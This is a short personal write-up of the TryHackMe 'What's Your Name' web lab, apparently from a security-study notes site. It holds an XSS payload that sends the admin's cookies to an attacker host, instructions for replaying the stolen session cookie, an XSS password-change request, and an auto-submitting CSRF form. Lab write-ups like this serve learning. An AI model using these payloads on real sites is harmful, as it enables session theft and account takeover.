---
title: "THM_Client-Side_What's Your Name"
parent: "Specific Labs"
grand_parent: "4 - Web_Application"
nav_order: 4
layout: default
---

# THM_Client-Side_What's Your Name

http://worldwap.thm/api/
http://login.worldwap.thm/


`<script>fetch('http://kaliIP/?'+btoa(document.cookie));</script>`
- this could get you the cookies of the admin/moderator



![](/assets/images/What's%20Your%20Name/Screenshot%202024-12-02%20at%203.45.36%20PM.png)

Simply add that as the cookie to `http://login.worldwap.thm/login.php` and refresh which logs you in. 

Then also add it to `http://worldwap.thm/public/html/` which allows you to access `http://worldwap.thm/public/html/admin.php` and `http://worldwap.thm/public/html/dashboard.php`. 

Inside `http://login.worldwap.thm/` we are able to access a chat app. I should have tested it to see that when we talked to the admin, it would click on something we sent it. I could have send it an XSS payload like:
```HTML
`<script>fetch('/change_password.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:"new_password=party1234"});</script>`
```

or created an HTML link which include a malicious payload and simply sent it the link. This didn't work, but it did for [this writeup](https://jaxafed.github.io/posts/tryhackme-whats_your_name/). Ex:

```HTML
<!DOCTYPE html> 
<html> 
<head> 	
	<title>CSRF</title> 
</head> 
<body> 
<form id="autosubmit" action="http://login.worldwap.thm/change_password.php" enctype="application/x-www-form-urlencoded" method="POST">
<input name="new_password" type="hidden" value="party1234" /> 
</form> 
<script>  document.getElementById("autosubmit").submit(); </script> 
</body> 
</html>
```
